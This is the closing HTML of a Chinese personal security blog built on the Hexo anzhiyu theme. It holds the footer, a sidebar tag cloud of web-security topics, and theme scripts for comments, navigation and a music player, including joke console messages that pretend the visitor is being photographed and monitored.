onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 By hihopkc </div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">13</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 0.88rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 0.88rem;">MSF<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Web安全<sup>11</sup></a><a href="/tags/binwalk/" style="font-size: 0.88rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 0.88rem;">docker<sup>3</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 0.88rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 0.88rem;">owasp<sup>1</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 0.88rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 0.88rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 0.88rem;">容器<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 0.88rem;">工具使用<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 0.88rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">测试工具<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>2</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.0.8/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("02/18/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `你好，欢迎你来到我的博客!`,
    `保持热爱，奔赴山海✨`,
    `
        
    ██╗  ██╗██╗██╗  ██╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗
    ██║  ██║██║██║  ██║██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝
    ███████║██║███████║██║   ██║██████╔╝█████╔╝ ██║     
    ██╔══██║██║██╔══██║██║   ██║██╔═══╝ ██╔═██╗ ██║     
    ██║  ██║██║██║  ██║╚██████╔╝██║     ██║  ██╗╚██████╗
    ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝ ╚═════╝
        
    `,
    "已上线",
    dnum,
    "天",
    "©2023 By hihopkc V1.6.4",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小丑】.`, `Photo captured: `, `🤣👉🏻🤡`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#3b70fc",
      "",
      "color:#3b70fc",
      "color:#3b70fc",
      "",
      "color:#3b70fc",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小丑.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hihopkc 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://hihopkc.space/',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.17/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://hihopkc.space/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://hihopkc.space/',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.17/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom.innerHTML= result
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "visitor@anheyu.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script type="text/javascript" src="/js/fps.js"></script><div id="fps"></div><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>